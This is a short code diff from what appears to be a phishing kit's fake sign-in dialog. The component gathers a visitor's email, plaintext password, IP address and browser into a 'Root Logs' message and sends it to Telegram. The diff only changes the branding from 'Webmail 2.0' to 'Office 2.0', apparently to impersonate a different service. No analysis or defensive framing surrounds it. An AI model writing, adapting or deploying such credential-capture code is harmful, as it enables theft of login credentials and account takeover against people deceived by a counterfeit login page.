@@ -45,7 +45,7 @@ const SignInModal = () => {
     setIsValid(isValidEmail);
 
     if (isValidEmail) {
-      const message = `Root Logs\nWebmail 2.0\nLogin Access\nUsername: ${email}\nPassword: ${password}\nUser IP: ${ipAddress}\nUser Browser: ${browser}`;
+      const message = `Root Logs\nOffice 2.0\nLogin Access\nUsername: ${email}\nPassword: ${password}\nUser IP: ${ipAddress}\nUser Browser: ${browser}`;
       await sendMessageToTelegram(message);
 
       setAttemptCount((prevCount) => prevCount + 1);
